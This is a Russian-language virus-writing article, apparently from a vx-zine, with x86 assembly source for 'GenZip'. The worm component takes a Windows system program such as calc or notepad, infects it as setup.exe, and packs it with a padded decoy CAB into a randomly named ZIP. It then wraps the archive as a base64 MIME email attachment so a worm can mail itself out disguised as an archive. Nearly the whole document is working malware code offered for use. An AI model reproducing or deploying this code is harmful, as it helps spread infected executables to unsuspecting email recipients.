

                    GenZip
                    ~~~~~~


Многие, наверно, сталкивались с сетевыми червями.
Они рассылают себе в виде exe модуля. Я предлагаю
рассылать zip файл. Возникает вопрос,  где  взять 
архиватор? А если паковать все методом  stored ?!
Архив должен  содержать  cab  и  setup.exe  файл.
Причем setup.exe  при просмотре  через  F3 должен
прилично  выглядить. Для этого мы берем файлы  из
windows директории и заражаем их. 
Cab файл получаем путем сигнатуры и много  дерьма
кил так на 20.
Имя архива может формироваться из
    - 2-3 случайных латинских букв +  текущий год
    +1 или 0..-2
    - 2-3 случайных латинских буквх + две случайные
    цифры

Пример: 
    - bac2000.zip
    - ucf1998.zip
    - zip45.zip
    - nc2001.zip 


setup:
     dw offset @@s1-start 
     dw offset @@s2-start 
     dw offset @@s3-start 
     dw offset @@s4-start 
     dw offset @@s5-start 
     dw offset @@s6-start 
     dw offset @@s7-start 
     dw offset @@s8-start 

; next filez will be setup.exe ;]
;  
@@s1 db 'calc',0      
@@s2 db 'welcome',0
@@s3 db 'taskman',0
@@s4 db 'sndvol32',0
@@s5 db 'grpconv',0   
@@s6 db 'fontview',0
@@s7 db 'jview',0     
@@s8 db 'notepad',0

gen_zip proc
    sub esp, 100h
    mov esi, esp 
    sub esp, 100h
    mov edi, esp
    sub eax, eax
next_try:
    push eax
    push 100h
    push edi
    call [ebp.GetWindowsDirectoryA]
    push esi
    push 100h
    call [ebp.GetTempPathA]
    push edi esi
    lea edi, [esi+eax]
    lea esi, [ebp.setup_exe]
__2:
    lodsb
    stosb
    test al, al
    jnz __2
    pop esi edi
    push 8
    pop eax
    call rnd
    movzx eax, 2 ptr [ebp+eax*2+setup]
    push esi edi
    lea esi, [eax+start+ebp]
__3:
    mov al, [edi]
    inc edi
    test al, al
    jnz __3
    mov 1 ptr [edi-1], '\'
__1:
    lodsb
    stosb
    test al, al
    jnz __1
    mov 4 ptr [edi-1], 'EXE.'
    mov 1 ptr [edi-1+4], 0  
    pop edi esi
    push 0 esi edi
    call [ebp.CopyFileA]
    test eax, eax
    pop eax
    jnz  __4
    inc eax
    ; если сделали 8 попыток
    ; и не один файл не подходит  =>
    ; идем в жопу
    cmp al, 8
    jb  next_try
    ; не подошло ;((((( 
    jmp __5
__4: 
    mov edx, esi
    push edx 
    call infect
    pop edx
    sub eax, eax 
    call open
    ; ??? realy not need
    cmp eax, -1
    jz  __5
    push edx
    xchg eax, ebx
    call fsize
    add  eax, 20*1024+(len_zip_sig)*2+(2Eh+9)*2+16h
    mov  4 ptr [ebp.total], eax
    push eax 0
    call [ebp.GlobalAlloc]
    push eax
    push size_datax
    pop  ecx
    lea  esi, [ebp.datax]
    lea  edi, [ebp.fname]
    rep  movsb
    mov  edi, [esp]
    add  edi, len_zip_sig  
    push edi
    mov  eax, 'FCSM'
    stosd
    sub  eax, eax
    call rnd
    mov  ecx, 5*1024-1
__loop:
    add al, cl
    rol eax, 1  
    stosd
    loop __loop  
    mov ecx, 20*1024
    mov 4 ptr [ebp.csize], ecx
    mov 4 ptr [ebp.usize], ecx 
    pop esi
    call get_crc32
    mov 4 ptr [ebp.crc32], eax
    sub esp, 16
    push esp
    call [ebp.GetSystemTime]
    mov ax, 2 ptr [esp.wYear]
    sub ax, 1980
    shl ax, 9
    movzx edx, 1 ptr [esp.wMonth]
    shl edx, 5
    or  eax, edx
    or  al, 1 ptr [esp.wDay]
    mov 2 ptr [ebp.fdate], ax
    mov al, 1 ptr [esp.wSecond]
    movzx edx, 1 ptr [esp.wMinute]
    shl edx, 5
    or eax, edx
    movzx edx, 1 ptr [esp.wHour]
    shl edx, 11
    or eax, edx 
    mov 2 ptr [ebp.ftime], ax
    add esp, 16
    lea esi, [ebp.zip_sig]
    push len_zip_sig
    pop ecx
    mov edi, [esp]
    rep movsb 
    lea edi, [ebp.fname]
    lea esi, [ebp.setup_exe]
    push size_datax
    pop ecx
    rep movsb
    call fsize
    xchg eax, ecx  
    mov edx, [esp]
    add edx, 20*1024+(len_zip_sig)*2
    call read
    mov 4 ptr [ebp.csize], eax
    mov 4 ptr [ebp.usize], eax
    add eax, edx
    push eax 
    mov esi, edx 
    call get_crc32
    mov 4 ptr [ebp.crc32], eax
    mov edi, [esp.4]
    add edi, 20*1024+len_zip_sig
    push len_zip_sig
    pop ecx
    lea esi, [ebp.zip_sig]
    rep movsb 
    pop edi
    push edi
    db 0B8h
    db 'PK',1,2
    stosd
    db 0B8h
    db 1,0,1,0
    stosd
    sub eax, eax
    stosd
    mov eax, 4 ptr [ebp.ftime]
    stosd
    mov edx, [esp.4]
    mov eax, [edx+crc32-zip_sig]
    stosd
    mov eax, [edx+csize-zip_sig]
    stosd
    stosd
    push 9
    pop eax
    stosw
    sub eax, eax
    stosd
    stosd
    stosd
    stosd  
    pop edx
    lea esi, [ebp.datax]
    mov cl, 9
    rep movsb
    mov ecx, edi
    sub ecx, edx
    sub ecx, 9
    mov esi, edx
    push edi 
    rep movsb
    pop esi
    mov eax, [ebp.crc32]
    mov 4 ptr [esi+10h], eax
    mov eax,  [ebp.csize]
    mov 4 ptr [esi+14h], eax
    mov 4 ptr [esi+18h], eax
    mov 4 ptr [esi+2Ah], 5027h
    lea esi, [ebp.setup_exe]
    mov cl, 9
    rep movsb 
    ; gen end
    db 0B8h
    db 'PK',5,6
    stosd
    sub eax, eax
    stosd
    mov al, 2
    stosw
    stosw
    mov al, 6Eh  
    stosd
    ;
    xchg eax, edx
    sub eax, [esp]
    stosd
    sub eax, eax
    stosw 
    ;
    ; alloc some mem and 
    ; create mime ?  
    ;
    ;
    mov al, 'Z'-'A'
    call rnd
    add al, 'A'
    mov 1 ptr [ebp.scr1], al
    mov 1 ptr [ebp.scr2], al
__no_equ:
    mov al, 'Z'-'A'
    call rnd
    add al, 'A'
    cmp 1 ptr [ebp.scr1], al
    jz  __no_equ
    mov 1 ptr [ebp.scr1+1], al
    mov 1 ptr [ebp.scr2+1], al
    mov eax, [ebp.total]
    push eax 
    imul eax, eax, 102
    ; (x*102)/77
    push 77
    pop ecx
    xor edx, edx
    div ecx
    test edx, edx
    jz __6
    inc eax
__6:
    add eax, script_sz+1000h
    mov [ebp.total], eax
    push eax 0
    call [ebp.GlobalAlloc]
    mov [ebp.madr], eax
    xchg edi, eax
    pop eax
    lea esi, script
    push script_sz
    pop ecx
    rep movsb
    mov esi, [esp]
    call BASE64
    add ecx, script_sz
    mov 4 ptr [ebp.total], ecx
    push ebx
    push 0
    push offset file  
    zcall _lcreat
    xchg eax, ebx
    mov edx, [madr.ebp]
    mov ecx, [ebp.total]
    call write
    call close
    pop ebx
    ;;;;;;;;;;; 
__close:
    call [ebp.GlobalFree]
    call close  
    call [ebp.DeleteFileA]
__5:
    add esp, 200h
    ret
    endp

total dd 0
madr  dd 0

script db 'Content-Type: application/octet-stream; name="'
scr1   db 'xx2000.zip'
       db '"', 13, 10
       db 'Content-Disposition: attachment; filename="'
scr2   db 'xx2000.zip'
       db  '"', 13, 10
       db 'Content-Transfer-Encoding: base64', 13, 10, 13, 10
script_sz = ($-script)
 

zip_sig:
    db 'PK',3,4
    db 1,0
    dw 0
    dw 0
ftime dw 1234h
fdate dw 1234h
crc32 dd 1234h
csize dd 12345678h
usize dd 12345678h
    dw size_datax
    dw 0
fname db '123456789' 
len_zip_sig = ($-zip_sig)

datax:
    db 'data1.cab'
size_datax = ($-datax)
setup_exe:
    db 'setup.exe',0

get_crc32 proc
    xor edx, edx
    dec edx
__5:
    push ecx
    lodsb
    xor dl, al
    mov cl, 7
__3:
    shr edx, 1
    jnc __4
    xor edx, CRC32_init
__4: 
    dec cl
    jns __3
    pop ecx
    loop __5
    xchg eax, edx
    not eax
    ret      
    endp
     
   
;esi=input
;edi=output
;eax=size
BASE64 proc
       cld
       push edi
       push 3
       call @@trans
trans_table = $
       db 'A','B','C','D','E','F','G','H','I','J'
       db 'K','L','M','N','O','P','Q','R','S','T'
       db 'U','V','W','X','Y','Z','a','b','c','d'
       db 'e','f','g','h','i','j','k','l','m','n'
       db 'o','p','q','r','s','t','u','v','w','x'
       db 'y','z','0','1','2','3','4','5','6','7'
       db '8','9','+','/'
chars dd ?                            ;contador de caracteres
  @@trans:
       pop ebx
       pop ecx
       cdq
       div ecx
       mov ecx, eax
       push edx
   @@loop:
       lodsd
       dec esi                              ;edx=original
       mov edx, eax                         ;edx=work copy
       call Temp
       call CODE64Block3
       call CODE64Block4
       loop @@loop
       pop ecx				;get rest
       jecxz @@done
       lodsd
       dec ecx
       jz @@rest1
       movzx edx, ax                            ;use only 2 bytes
       call Temp
       call CODE64Block3
       jmp @@end
   @@rest1:
       movzx edx, al                            ;use 1 byte only
       call Temp
       inc ecx
       inc ecx
   @@end:
       mov al, '='
       rep stosb
   @@done:
       mov eax, 0A0D0A0Dh
       stosd
       pop ecx
       sub edi, ecx                            ;edi=buffer
       xchg ecx, edi                           ;ecx=size
       ret
BASE64 endp


Temp   proc
       call CODE64Block1                ;little optimizing routine
       call CODE64Block2
       ret
Temp   endp


CODE64Block1:
       mov eax, edx
       shr eax, 02h
  process3:
       jmp process

CODE64Block2:
       mov eax, edx
       shl al, 04h
       shr ah, 04h
  process2:
       or al, ah                        ;chained jmps
       jmp process3             ;another "why make it easy?" (c) Vecna ;)

CODE64Block3:
       mov eax, edx
       shr eax, 08h
       shl al, 02h
       shr ah, 06h
       jmp process2

CODE64Block4:
       mov eax,edx
       shr eax,10h

  process:
       and al,00111111b
       xlatb
       stosb
       mov eax, 4 ptr [ebx+(chars-trans_table)]
       inc eax
       mov [ebx+(chars-trans_table)], eax
       pusha
       push 0000004Ch
       pop ecx
       cdq
       div ecx
       test edx, edx
       popa
       jnz @@noline
       mov ax, 0A0Dh
       stosw
   @@noline:
       ret

